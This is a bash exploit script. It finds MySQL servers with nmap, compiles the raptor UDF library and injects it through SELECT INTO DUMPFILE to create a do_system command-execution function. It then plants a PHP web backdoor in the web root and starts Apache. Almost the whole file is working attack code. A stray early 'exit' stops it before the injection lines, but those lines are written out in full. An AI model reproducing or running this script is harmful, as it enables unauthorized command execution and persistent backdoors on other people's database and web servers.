#!/bin/bash

#USAGE
#bash ./exploit.sh user host password backdoor_location
while getopts ":u:p:h:b:" opt; do
  case ${opt} in
    u ) # process option a
      user=$OPTARG;;
    p ) # process option t
      password=$OPTARG;;
    h )
	  host=$OPTARG;;
	b )
	  backdoor=$OPTARG;;
	: )
	  echo "Invalid option: $OPTARG requires an argument"
	  exit
	  ;;
    \? ) 
	  echo "Usage: exploit.sh -b /path/to/backdoor -p password -u user [-h host]"
	  exit
      ;;
  esac
done

shift $((OPTIND -1))

if [ -z $host ]
then
	echo "No host given. Using nmap to search for targets..."
	read -r -a host <<< "$(nmap -p 3306 --open -oG - 10.202.208.0-255 | grep Host | cut -f2 -d' ' )"
	echo "${host[0]}"
	exit
fi
#Check for raptor_udf2.c
if [ ! -f $PWD/raptor_udf2.c ]
then
	echo "raptor_udf2.c file not found in the directory containing exploit.sh"
	exit
else
	echo "raptor_udf2.c file found"
fi
#Check for simple-backdoor.php or whatever backdoor is given as an argument
if [ ! -e $backdoor ]
then
	echo "Nothing was found at $backdoor, double check your backdoor location."
	exit
else
	echo "Backdoor found at $backdoor"
fi

#Check for gcc and hexdump

deps=( 'gcc' 'hexdump' )
req_missing=0
for i in "${deps[@]}"
do
	if [ "$(which $i)" == "" ]
	then
		echo -e "\033[1;31m[MISSING]\033[0m: $i"
		req_missing=1
	else
		echo -e "\033[1;32m[OK]\033[0m: $i"
	fi
done

if [ $req_missing -eq 1 ]
then
	echo "You are missing one or more required packages. Exiting..."
	exit
else
	echo "You have all required packages. Continuing..."
fi

#Create raptor_udf2.so

gcc -g -c raptor_udf2.c 
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

#Generate hex of raptor_udf2.so
rapt="$( hexdump -ve '1/1 "%.2x"' $PWD/raptor_udf2.so )"

#Generate hex of backdoor
bd="$( hexdump -ve '1/1 "%.2x"' $backdoor )"

#Connect to mysql database using given username, password, and host

#Get the plugin_dir
exit
plugin_dir="$( mysql -u ${user} -h ${host} -p${password} -sNe 'select @@plugin_dir' )"
#Inject the UDF and backdoor
mysql -u $user -h $host -p$password -e "select 0x$rapt into dumpfile '${plugin_dir}raptor_udf2.so';drop function if exists do_system;create function do_system returns integer soname 'raptor_udf2.so';select 0x$bd into dumpfile '/var/www/html/${backdoor##*/}';select do_system('apache2ctl start');"

echo "Backdoor installed at $host/${backdoor##*/}"
